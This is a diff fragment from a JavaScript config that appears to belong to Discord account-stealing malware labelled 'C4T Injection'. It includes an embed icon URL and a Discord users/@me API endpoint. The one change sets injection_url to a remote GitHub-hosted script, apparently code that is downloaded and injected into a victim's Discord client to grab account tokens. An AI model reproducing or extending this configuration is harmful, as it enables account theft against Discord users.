@@ -13,7 +13,7 @@ const config = {
   embed_name: 'C4T Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1120089993197670420/1203335449779900427/ld-have-a-shadowy-ethereal-appeara.jpeg?ex=65d0b878&is=65be4378&hm=3986c558ce9a1afc3df163806d8f461f3ded371bc585dde3a41f5e59823c8c29&=&format=webp&width=408&height=408'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/Sorcierr/inejctionn/main/injec2.js', 
 
 
   api: 'https://discord.com/api/v9/users/@me',
